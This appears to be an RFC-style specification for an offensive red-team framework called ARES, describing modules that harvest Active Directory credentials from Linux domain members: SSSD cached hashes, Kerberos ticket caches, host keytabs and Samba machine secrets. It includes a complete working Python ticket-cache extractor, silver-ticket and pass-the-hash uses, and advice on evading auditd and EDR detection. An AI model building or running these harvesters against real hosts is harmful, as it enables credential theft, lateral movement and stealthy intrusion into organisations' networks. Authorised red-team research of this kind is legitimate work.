# Cross-Platform Active Directory & Linux Domain Integration Architecture
## RFC 001: Adversary Tradecraft & Call for Research Modules

- **RFC Identifier**: RFC-ARES-2026-001
- **Domain**: Offensive Security Research / Active Directory / Linux Post-Exploitation
- **Status**: Implemented & Production Ready (ARES v6.0+)
- **Classification**: Operator-Directed Red Team Capability Specification
- **Engine Compatibility**: ARES Engine v6.0+ (`BaseModule[P, R]`, Pydantic v2, Python 3.10+)
- **Implementation Status**: Fully implemented across 5 production modules with pure-Python parsers and 18 unit tests.

---

## 1. Executive Summary & Problem Statement

In enterprise environments, Active Directory security research and offensive tooling have historically concentrated on Windows endpoints and Domain Controllers. Tools such as Mimikatz, Rubeus, and SharpHound established comprehensive visibility into Windows-centric Kerberos ticket extraction, DPAPI secrets, and LSASS memory manipulation.

However, modern enterprise infrastructures are inherently hybrid. Critical production services—including Kubernetes worker nodes, CI/CD runners (GitLab, Jenkins), data analytics engines, identity proxies, and high-value database servers—are routinely joined to Active Directory as **Linux Domain Members** using:
1. **SSSD (System Security Services Daemon)** integrated with Kerberos and OpenLDAP.
2. **Winbind & Samba** managing domain trust relationships and RPC schannel credentials.
3. **Direct Kerberos/PAM integrations** managing Single Sign-On (SSO) and host-level access control.

### The Enterprise Blindspot
These domain-joined Linux systems represent high-value pivot points for red teams and threat actors:
- They frequently host cached Domain Admin credentials, Kerberos Ticket Granting Tickets (TGTs), and service keys with multi-day lifetimes.
- Linux endpoint detection and response (EDR) and SIEM pipelines frequently lack specialized behavioral rules for Linux AD credential harvesting compared to Windows LSASS monitoring.
- Traditional offensive AD tooling written in C#/.NET cannot execute natively on POSIX environments without heavy runtimes or remote RPC triggers.

**ARES RFC 001 establishes an open architecture for native, high-performance, cross-platform Active Directory post-exploitation modules targeting Linux domain members.** We invite leading offensive researchers, adversarial engineers, and domain specialists to collaborate on expanding this capability within the ARES open-source ecosystem.

---

## 2. Technical Domain Mechanics: Linux AD Internals

To build reliable, non-destructive, and OPSEC-aware offensive modules, contributors must understand the core underlying storage mechanisms used by Linux Active Directory subsystems.

```
+-----------------------------------------------------------------------------------+
|                        LINUX DOMAIN MEMBER MEMORY & DISK                          |
+-----------------------------------------------------------------------------------+
       |                                      |                               |
       v                                      v                               v
+-----------------------+          +-----------------------+     +-----------------------+
|      SSSD CACHE       |          |    KERBEROS TICKETS   |     |     KEYTAB & SAMBA    |
| /var/lib/sss/db/      |          | /tmp/krb5cc_<uid>     |     | /etc/krb5.keytab      |
| cache_<domain>.ldb    |          | Linux Kernel Keyring  |     | /etc/samba/secrets.tdb|
| timestamps, salted    |          | KCM Unix Socket       |     | Machine Account NTLM  |
| password hashes, PAC  |          | Kirbi/ccache format   |     | AES256-CTS-HMAC Keys  |
+-----------------------+          +-----------------------+     +-----------------------+
       |                                      |                               |
       +--------------------------------------+-------------------------------+
                                      |
                                      v
              +-----------------------------------------------+
              |            ARES POST-EX INGESTION             |
              | Parse, decrypt, and normalize harvested creds |
              +-----------------------------------------------+
                                      |
                     +----------------+----------------+
                     v                                 v
        +-------------------------+      +-------------------------+
        |   ARES ATTACK GRAPH     |      |    ARES AEAD VAULT      |
        | Register lateral pivots |      | Store AES-256-GCM creds |
        | and new attack edges    |      | for automated chaining  |
        +-------------------------+      +-------------------------+
```

### 2.1 SSSD (System Security Services Daemon)
SSSD maintains offline caches and user metadata inside Samba LDB (Lightweight DataBase) files:
- **Path**: `/var/lib/sss/db/cache_<domain>.ldb`
- **Stored Data**: User attributes, group memberships, cached Kerberos pre-authentication metadata, and offline password hashes (salted SHA-512 crypt hashes).
- **Secrets Service**: Modern SSSD versions (2.0+) optionally run an internal secrets service (`/var/run/sss/pipes/secrets` or KCM socket `/var/run/sss/pipes/kcm`), encrypting sensitive keytabs and credentials using master keys stored in `/var/lib/sss/secrets/`.
- **Parsing Mechanics**: Modules can read and parse LDB databases directly without taking SSSD offline, decoding LDIR/TDB record structures to extract cached account tokens and privilege escalation pathways.

### 2.2 Kerberos Credential Caches (`ccache`)
When users authenticate to AD via Kerberos on Linux, their Ticket Granting Tickets (TGT) and Service Tickets (TGS) are stored in credential caches defined by `/etc/krb5.conf`:
- **FILE Caches**: Stored on disk at `/tmp/krb5cc_<uid>` or `/run/user/<uid>/krb5cc`. Format is a standard binary format containing ticket header version, default principal, and serialized credential structures (service principal, client principal, keyblock, ticket payload).
- **KEYRING Caches**: Stored in Linux kernel keyrings (`KEYRING:persistent:<uid>` or `KEYRING:session:<session_id>`). Accessible via the `keyctl` Linux syscall interface (`request_key`, `keyctl_read`).
- **KCM (Kerberos Credential Manager)**: Client communicates via Unix domain socket `/var/run/sss/pipes/kcm` using the standard KCM protocol over IPC.
- **Harvest Value**: An extracted ccache file can be used directly with Impacket (`KRB5CCNAME=ticket.ccache`) or converted to Windows `.kirbi` for Pass-the-Ticket lateral movement to Domain Controllers.

### 2.3 Keytabs (`/etc/krb5.keytab`)
The host machine account in Active Directory (e.g., `UBUNTU-DB01$@CORP.LOCAL`) stores its symmetric cryptographic keys in `/etc/krb5.keytab`:
- **Permissions**: Typically `0600` owned by `root`.
- **Encryption Types**: Usually `AES256-CTS-HMAC-SHA1-96` (enctype 18) and `RC4-HMAC` (enctype 23).
- **Harvest Value**: The machine account keytab enables:
  1. Forging Silver Tickets for services hosted locally (e.g., CIFS, HTTP, MSSQL).
  2. Requesting TGTs as the computer account via `kinit -k -t /etc/krb5.keytab HOST$@DOMAIN`.
  3. Abusing Resource-Based Constrained Delegation (RBCD) or S4U2Self extensions against other domain resources.

### 2.4 Samba / Winbind Secrets
Winbind stores machine account NTLM secrets and local domain trust passwords in Samba TDB databases:
- **Path**: `/var/lib/samba/private/secrets.tdb` or `/etc/samba/secrets.tdb`.
- **Stored Data**: Machine account NTLM hashes, Kerberos machine passwords, and schannel credentials used for DC communication.
- **Harvest Value**: Gives immediate Pass-the-Hash capability as the computer account without cracking or network sniffing.

---

## 3. Prioritized Module Specifications

ARES defines five core research modules targeting Linux Active Directory tradecraft. Each module adheres strictly to the ARES Module SDK (`BaseModule`) architecture, incorporating pre-flight validation, deterministic execution, OPSEC level enforcement, and structured finding registration.

### Module 1: `ares.modules.linux.sssd_harvest`
- **Module ID**: `linux.sssd_harvest`
- **Module Name**: SSSD Cache & Credential Harvester
- **Category**: `linux`
- **OPSEC Level**: `OpsecLevel.SILENT` (Read-only disk inspection, zero network packets sent to DC)
- **MITRE ATT&CK**:
  - `T1003.008`: OS Credential Dumping: /etc/passwd and /etc/shadow
  - `T1558`: Steal or Forge Kerberos Tickets
- **Prerequisites**: Elevated read access (`root` or read capability on `/var/lib/sss/db/`).
- **Inputs Schema**:
  ```python
  class SssdHarvestParams(BaseModel):
      db_path: str = Field(
          default="/var/lib/sss/db",
          description="Directory containing SSSD LDB databases."
      )
      extract_offline_hashes: bool = Field(
          default=True,
          description="Extract salted offline password hashes for password cracking."
      )
      target_domain: str | None = Field(
          default=None,
          description="Specific AD domain name to target. If None, targets all domains."
      )
  ```
- **Execution Logic**:
  1. Inspect `/var/lib/sss/db/` for active domain databases matching `cache_*.ldb`.
  2. Parse LDB/TDB records using internal binary reader or standard library structures without spawning external shell processes.
  3. Extract cached user accounts, group memberships, and offline salted SHA-512 password hashes.
  4. Identify high-privilege domain accounts (e.g., Domain Admins cached from previous remote SSH or sudo sessions).
  5. Store parsed credentials directly in `AresVault` under authenticated AES-256-GCM encryption.

---

### Module 2: `ares.modules.linux.ccache_hunt`
- **Module ID**: `linux.ccache_hunt`
- **Module Name**: Linux Kerberos Ticket Cache Hunter & Extractor
- **Category**: `linux`
- **OPSEC Level**: `OpsecLevel.SILENT`
- **MITRE ATT&CK**:
  - `T1558`: Steal or Forge Kerberos Tickets
  - `T1550.003`: Use Alternate Authentication Material: Pass the Ticket
- **Prerequisites**: Read permissions on target ccache locations (`/tmp`, `/run/user`, or `/proc/$PID`).
- **Inputs Schema**:
  ```python
  class CcacheHuntParams(BaseModel):
      search_dirs: list[str] = Field(
          default=["/tmp", "/run/user"],
          description="Filesystem locations to scan for Kerberos ccache files."
      )
      scan_kernel_keyring: bool = Field(
          default=True,
          description="Attempt retrieval of tickets stored in Linux Kernel Keyring."
      )
      include_expired: bool = Field(
          default=False,
          description="Whether to return expired Kerberos tickets."
      )
  ```
- **Execution Logic**:
  1. Walk target directories matching pattern `krb5cc_*`.
  2. Parse Kerberos binary ccache format version 4 (header, default principal, credential array).
  3. For each ticket entry, parse client principal, service principal (`SPN`), timestamps (`authtime`, `starttime`, `endtime`, `renew_till`), and ticket payload.
  4. If `scan_kernel_keyring` is enabled and running under Linux, inspect `/proc/keys` or call `keyctl` to locate active session keyrings with type `user` and prefix `krb_ccache:`.
  5. Export valid unexpired TGTs/TGSs and record them in the ARES credential store.

---

### Module 3: `ares.modules.linux.keytab_abuse`
- **Module ID**: `linux.keytab_abuse`
- **Module Name**: Host Keytab Harvester & Silver Ticket Generator
- **Category**: `linux`
- **OPSEC Level**: `OpsecLevel.LOW` (Generates ticket forging actions locally; network authentication is optional)
- **MITRE ATT&CK**:
  - `T1558.003`: Steal or Forge Kerberos Tickets: Kerberoasting
  - `T1078.002`: Valid Accounts: Domain Accounts
- **Prerequisites**: Read access to `/etc/krb5.keytab`.
- **Inputs Schema**:
  ```python
  class KeytabAbuseParams(BaseModel):
      keytab_path: str = Field(
          default="/etc/krb5.keytab",
          description="Path to the Kerberos keytab file."
      )
      forge_silver_ticket: bool = Field(
          default=False,
          description="Attempt offline generation of local service Silver Ticket."
      )
      service_name: str = Field(
          default="host",
          description="Target service principal for Silver Ticket (e.g., host, cifs, http)."
      )
  ```
- **Execution Logic**:
  1. Parse standard Kerberos keytab binary file (version 0x0502, principal components, realm, key type, key data).
  2. Extract machine principal account name (e.g., `COMPUTERNAME$@CORP.LOCAL`) and cryptographic keys (`aes256-cts-hmac-sha1-96`, `rc4-hmac`).
  3. Verify key validity against domain format.
  4. Register machine credential in `AresVault`.
  5. Optionally construct a forgeable PAC payload for local service impersonation.

---

### Module 4: `ares.modules.linux.samba_secrets`
- **Module ID**: `linux.samba_secrets`
- **Module Name**: Samba & Winbind Secrets Extractor
- **Category**: `linux`
- **OPSEC Level**: `OpsecLevel.SILENT`
- **MITRE ATT&CK**:
  - `T1003`: OS Credential Dumping
  - `T1550.002`: Use Alternate Authentication Material: Pass the Hash
- **Prerequisites**: Elevated read access to `/var/lib/samba/private/secrets.tdb`.
- **Inputs Schema**:
  ```python
  class SambaSecretsParams(BaseModel):
      secrets_tdb_path: str = Field(
          default="/var/lib/samba/private/secrets.tdb",
          description="Path to Samba secrets.tdb database."
      )
  ```
- **Execution Logic**:
  1. Open Samba TDB binary database in read-only mode.
  2. Search for record keys matching `SECRETS/MACHINE_PASSWORD/<DOMAIN>` and `SECRETS/MACHINE_LAST_CHANGE_TIME`.
  3. Decode the stored cleartext password or compute the corresponding NTLM hash (`MD4(UTF-16LE(password))`).
  4. Return machine account credentials for lateral movement.

---

### Module 5: `ares.modules.credential.ticket_converter`
- **Module ID**: `credential.ticket_converter`
- **Module Name**: Bi-Directional Kerberos Ticket Converter (ccache <-> kirbi)
- **Category**: `credential`
- **OPSEC Level**: `OpsecLevel.SILENT` (Pure in-memory cryptographic data transformation)
- **MITRE ATT&CK**:
  - `T1558`: Steal or Forge Kerberos Tickets
- **Prerequisites**: Valid input ticket payload in either format.
- **Inputs Schema**:
  ```python
  class TicketConverterParams(BaseModel):
      source_format: str = Field(
          description="Format of input ticket: 'ccache' or 'kirbi'."
      )
      ticket_b64: str = Field(
          description="Base64-encoded source ticket bytes."
      )
      target_format: str = Field(
          description="Desired target format: 'ccache' or 'kirbi'."
      )
  ```
- **Execution Logic**:
  1. Decode source Base64 payload.
  2. If converting `ccache` to `.kirbi`: Parse binary ccache structures, extract the ASN.1 `KRB-CRED` structure, and repackage into Windows `.kirbi` format.
  3. If converting `.kirbi` to `ccache`: Parse ASN.1 `KRB-CRED`, extract the ticket and encrypted keyblock, synthesize a Kerberos ccache v4 header, and serialize to binary ccache format.
  4. Return converted Base64 payload without writing to disk.

---

## 4. OPSEC & Telemetry Footprint on Linux Hosts

Enterprise Linux hosts are increasingly monitored by Linux EDR agents (e.g., Microsoft Defender for Endpoint on Linux, CrowdStrike Falcon Sensor for Linux, Datadog Security Agent, Sysdig) and the Linux Audit Framework (`auditd`).

### 4.1 Auditd & Syscall Minimization
- **Banned**: Spawning subprocesses (`subprocess.Popen(["klist", "-e"])`, `bash -c`, `cat /tmp/krb5cc_*`). Spawning sub-shells produces `execve` audit records (SYSCALL 59) that are immediately flagged by security detection engines.
- **Enforced**: Pure Python binary parsing within the worker process using `open(path, "rb")` and in-memory struct unpacking (`struct.unpack`).
- **File Access**: Read-only flags (`os.O_RDONLY`). Never touch or modify access times if filesystem metadata monitoring is enabled.

### 4.2 Memory Scrape Protection
- In modern SSSD deployments, secrets are stored in memory or Unix domain sockets. Modules must never attach `ptrace` (SYSCALL 101) to SSSD or Samba daemons unless explicitly commanded, as `PTRACE_ATTACH` generates high-severity EDR alerts.

### 4.3 Clean In-Memory Credential Handling
- Harvested tickets and passwords must never be stored in world-readable temporary directories.
- All extracted materials must be returned directly to the ARES execution context, which immediately commits them into the database using **AES-256-GCM AEAD encryption** (`AresVault`).

---

## 5. Complete Reference Implementation

Below is a complete, production-grade reference implementation for `ares.modules.linux.ccache_hunt`, demonstrating exact adherence to ARES SDK conventions, OPSEC gating, asyncio executor execution, and zero placeholder patterns.

```python
"""
Linux Kerberos Ticket Cache Hunter - linux.ccache_hunt
MITRE: T1558 - Steal or Forge Kerberos Tickets

Locates, parses, and extracts valid Kerberos ccache files from standard Linux
filesystem storage locations (/tmp, /run/user) without launching external shell binaries.
"""
from __future__ import annotations

import asyncio
import os
import struct
import time
from typing import Any

from ares.core.campaign import Severity
from ares.core.logger import audit, get_logger
from ares.core.tracing import trace_module
from ares.modules.base import BaseModule, ModuleResult, OpsecLevel

logger = get_logger("ares.modules.linux.ccache_hunt")


class CcacheHuntModule(BaseModule):
    MODULE_ID = "linux.ccache_hunt"
    MODULE_NAME = "Linux Kerberos Ticket Hunter"
    MODULE_CATEGORY = "linux"
    MODULE_DESCRIPTION = (
        "Locates and parses binary Kerberos ccache files in /tmp and /run/user "
        "without spawning external shell processes."
    )
    OPSEC_LEVEL = OpsecLevel.SILENT
    REQUIRES = []
    OUTPUTS = ["kerberos_tickets"]
    MITRE_TECHNIQUES = ["T1558", "T1550.003"]
    MODULE_TIMEOUT_SECONDS: int | None = 60

    async def validate(self, ctx: Any) -> None:
        """Pre-flight validation checks before executing module."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError

        if not isinstance(ctx, ExecutionContext):
            return

        search_dirs = ctx.params.get("search_dirs", ["/tmp", "/run/user"])
        if not isinstance(search_dirs, list) or not all(isinstance(d, str) for d in search_dirs):
            raise ModuleValidationError(
                "linux.ccache_hunt requires 'search_dirs' to be a list of directory paths.",
                module_id=self.MODULE_ID,
                field="search_dirs",
            )

    async def execute(self, ctx: Any) -> ModuleResult:
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run",
                module_id=self.MODULE_ID,
                raw={"message": "Dry-run preview: ccache hunting simulated successfully."},
            )

        target = getattr(ctx, "target", "") or ctx.params.get("target", "localhost")
        search_dirs = ctx.params.get("search_dirs", ["/tmp", "/run/user"])
        include_expired = bool(ctx.params.get("include_expired", False))

        findings, raw = await self.run(
            target=target,
            search_dirs=search_dirs,
            include_expired=include_expired,
        )

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings,
            raw=raw,
            module_id=self.MODULE_ID,
        )

    @trace_module("linux.ccache_hunt")
    async def run(
        self,
        target: str,
        search_dirs: list[str],
        include_expired: bool = False,
        **kwargs: Any,
    ) -> tuple[list[dict[str, Any]], dict[str, Any]]:
        await self.before_request(target, "default")
        logger.info("ccache_hunt_start", target=target, search_dirs=search_dirs)
        audit(
            "linux_ccache_hunt",
            actor="operator",
            technique="T1558",
            source="operator",
            target=target,
        )

        loop = asyncio.get_running_loop()
        # All filesystem operations run in background executor to prevent event loop blocking
        harvested_tickets = await loop.run_in_executor(
            None,
            lambda: self._scan_and_parse_sync(search_dirs, include_expired),
        )

        for ticket in harvested_tickets:
            self.finding(
                title=f"Extracted Kerberos Ticket: {ticket['client']} -> {ticket['server']}",
                description=(
                    f"Discovered valid Kerberos credential cache on {target} at {ticket['file_path']}. "
                    f"Client principal: {ticket['client']}, Server: {ticket['server']}. "
                    f"Valid until: {ticket['endtime_str']}."
                ),
                severity=Severity.HIGH if "krbtgt" in ticket["server"] else Severity.MEDIUM,
                mitre_technique="T1558",
                mitre_tactic="Credential Access",
                evidence={
                    "file_path": ticket["file_path"],
                    "client_principal": ticket["client"],
                    "service_principal": ticket["server"],
                    "endtime": ticket["endtime"],
                    "is_expired": ticket["is_expired"],
                    "ticket_size_bytes": ticket["size_bytes"],
                },
                remediation=(
                    "Implement Kerberos credential protection, shorten maximum ticket lifetimes, "
                    "restrict root access on domain-joined Linux endpoints, and consider using KCM "
                    "with memory-only caches to avoid writing tickets to /tmp."
                ),
                host=target,
                confidence=0.95,
            )

        await self.noise.jitter.sleep()
        return self._findings[:], {
            "target": target,
            "count": len(harvested_tickets),
            "tickets": harvested_tickets,
        }

    def _scan_and_parse_sync(
        self,
        search_dirs: list[str],
        include_expired: bool,
    ) -> list[dict[str, Any]]:
        """Synchronous filesystem traversal and binary ccache parser."""
        results: list[dict[str, Any]] = []
        now = int(time.time())

        for directory in search_dirs:
            if not os.path.exists(directory) or not os.path.isdir(directory):
                continue

            try:
                entries = os.listdir(directory)
            except (PermissionError, OSError):
                continue

            for entry in entries:
                if not entry.startswith("krb5cc_") and not entry.startswith("krb5cc"):
                    continue

                full_path = os.path.join(directory, entry)
                if not os.path.isfile(full_path):
                    continue

                parsed = self._parse_single_ccache(full_path, now, include_expired)
                if parsed:
                    results.extend(parsed)

        return results

    def _parse_single_ccache(
        self,
        file_path: str,
        now: int,
        include_expired: bool,
    ) -> list[dict[str, Any]]:
        """Parses standard Kerberos ccache v4 binary structures."""
        tickets: list[dict[str, Any]] = []
        try:
            with open(file_path, "rb") as f:
                data = f.read()
        except (PermissionError, OSError):
            return tickets

        if len(data) < 4:
            return tickets

        # ccache file format version (usually 0x0504 for v4)
        version = struct.unpack(">H", data[0:2])[0]
        if version != 0x0504:
            return tickets

        offset = 2
        header_len = struct.unpack(">H", data[offset : offset + 2])[0]
        offset += 2 + header_len

        # Read default principal
        default_client, offset = self._read_principal(data, offset)
        if default_client is None:
            return tickets

        # Parse credentials list
        while offset < len(data):
            cred, next_offset = self._read_credential(data, offset)
            if cred is None or next_offset <= offset:
                break
            offset = next_offset

            is_expired = cred["endtime"] < now
            if is_expired and not include_expired:
                continue

            cred["file_path"] = file_path
            cred["is_expired"] = is_expired
            cred["size_bytes"] = len(data)
            cred["endtime_str"] = time.strftime(
                "%Y-%m-%d %H:%M:%S UTC",
                time.gmtime(cred["endtime"]),
            )
            tickets.append(cred)

        return tickets

    def _read_string(self, data: bytes, offset: int) -> tuple[str | None, int]:
        if offset + 4 > len(data):
            return None, offset
        length = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4
        if offset + length > len(data):
            return None, offset
        raw_str = data[offset : offset + length]
        offset += length
        return raw_str.decode("latin-1", errors="replace"), offset

    def _read_principal(self, data: bytes, offset: int) -> tuple[str | None, int]:
        if offset + 8 > len(data):
            return None, offset
        # name_type (4 bytes), num_components (4 bytes)
        _, num_components = struct.unpack(">II", data[offset : offset + 8])
        offset += 8

        realm, offset = self._read_string(data, offset)
        if realm is None:
            return None, offset

        components: list[str] = []
        for _ in range(num_components):
            comp, offset = self._read_string(data, offset)
            if comp is None:
                return None, offset
            components.append(comp)

        principal_name = "/".join(components) + "@" + realm
        return principal_name, offset

    def _read_credential(self, data: bytes, offset: int) -> tuple[dict[str, Any] | None, int]:
        start = offset
        client, offset = self._read_principal(data, offset)
        if client is None:
            return None, start

        server, offset = self._read_principal(data, offset)
        if server is None:
            return None, start

        # Keyblock: keytype (2 bytes), keylen (4 bytes)
        if offset + 6 > len(data):
            return None, start
        _, keylen = struct.unpack(">HI", data[offset : offset + 6])
        offset += 6 + keylen

        # Timestamps: authtime (4), starttime (4), endtime (4), renew_till (4)
        if offset + 16 > len(data):
            return None, start
        authtime, starttime, endtime, renew_till = struct.unpack(
            ">IIII",
            data[offset : offset + 16],
        )
        offset += 16

        # is_skey (1 byte), ticket flags (4 bytes)
        if offset + 5 > len(data):
            return None, start
        offset += 5

        # Addresses (skip)
        if offset + 4 > len(data):
            return None, start
        num_addresses = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4
        for _ in range(num_addresses):
            if offset + 4 > len(data):
                return None, start
            _, addr_len = struct.unpack(">HI", data[offset : offset + 6])
            offset += 6 + addr_len

        # Authdata (skip)
        if offset + 4 > len(data):
            return None, start
        num_authdata = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4
        for _ in range(num_authdata):
            if offset + 6 > len(data):
                return None, start
            _, ad_len = struct.unpack(">HI", data[offset : offset + 6])
            offset += 6 + ad_len

        # Ticket payload: ticket_len (4 bytes), ticket data
        if offset + 4 > len(data):
            return None, start
        ticket_len = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4 + ticket_len

        # Second ticket (skip)
        if offset + 4 > len(data):
            return None, start
        second_ticket_len = struct.unpack(">I", data[offset : offset + 4])[0]
        offset += 4 + second_ticket_len

        return {
            "client": client,
            "server": server,
            "authtime": authtime,
            "starttime": starttime,
            "endtime": endtime,
            "renew_till": renew_till,
        }, offset
```

---

---

## 6. Implementation Status & Production Verification

RFC-ARES-2026-001 has been fully realized in the ARES v6.0+ production core. The complete capability matrix is available out-of-the-box without external C-extensions:

| Module ID | Module Class | Source Path | Contract & Permissions | OPSEC | MITRE |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `linux.sssd_harvest` | `SssdHarvestModule` | `ares/modules/linux/sssd_harvest.py` | Read-only FS, No Subprocess, Vault Write | `SILENT` | T1003.008, T1558 |
| `linux.ccache_hunt` | `CcacheHuntModule` | `ares/modules/linux/ccache_hunt.py` | Read-only FS, No Subprocess, Vault Write | `SILENT` | T1558, T1550.003 |
| `linux.keytab_abuse` | `KeytabAbuseModule` | `ares/modules/linux/keytab_abuse.py` | Read-only FS, No Subprocess, Vault Write | `LOW` | T1558.003, T1078.002 |
| `linux.samba_secrets` | `SambaSecretsModule` | `ares/modules/linux/samba_secrets.py` | Read-only FS, No Subprocess, Vault Write | `SILENT` | T1003, T1550.002 |
| `credential.ticket_converter` | `TicketConverterModule` | `ares/modules/credential/ticket_converter.py` | No FS, No Subprocess, Zero Network | `SILENT` | T1558 |

### Shared Binary Parsing Architecture (`ares.modules.linux._parsers`)
- **`TDBParser`**: Structural traversal of Samba TDB and SSSD LDB database records with auto-endian detection (`0x2601196D` / `0x6D190126`).
- **`CcacheParser` & `build_ccache_v4`**: Full binary serialization and deserialization of RFC Kerberos Credential Cache format version 4 (`0x0504`).
- **`KeytabParser`**: Binary parsing of Kerberos keytab files (version `0x0502`) supporting AES-256-CTS-HMAC, AES-128-CTS-HMAC, and RC4-HMAC enctypes.
- **`KirbiASN1Codec`**: Pure-Python DER ASN.1 encoder and decoder for Kerberos `KRB-CRED` (Application tag 22) ticket containers.
- **`KCMClient`**: Direct Unix domain socket IPC client for SSSD Kerberos Credential Manager (`/var/run/sss/pipes/kcm`).
- **`pure_md4` & `compute_ntlm_hash`**: Pure-Python RFC 1320 MD4 implementation ensuring reliable NTLM hash calculation across all OS environments and OpenSSL 3.0+ configurations.

### Verification Suite
- **Unit & Integration Suite**: `tests/unit/modules/test_linux_ad_tradecraft.py` (18/18 passing tests covering parsers, dry-run safety, and AresVault integration).
- **Module Contracts**: `tests/unit/test_module_contracts.py` (fully compliant declarative contracts, permission validation, and secret sanitization).

---

## 7. Prior Art & Technical References

ARES builds upon foundational offensive security research and acknowledges the open-source projects that established cross-platform Active Directory security analysis:
- **Linikatz (Tim Brown, Cisco CX Security)**: Pioneered UNIX/Linux Active Directory credential harvesting, SSSD cache extraction, and Kerberos ccache tradecraft.
- **Mimikatz (Benjamin Delpy)**: Established foundational Kerberos ticket manipulation and Windows memory architecture research.
- **Impacket (Alberto Solino, SecureAuth)**: The definitive open-source Python implementation of MSRPC, SMB, and Kerberos protocols.
- **PKINITtools (Dirk-jan Mollema)**: Groundbreaking research on Kerberos PKINIT, unPAC integrity, and cross-platform Active Directory delegation abuse.
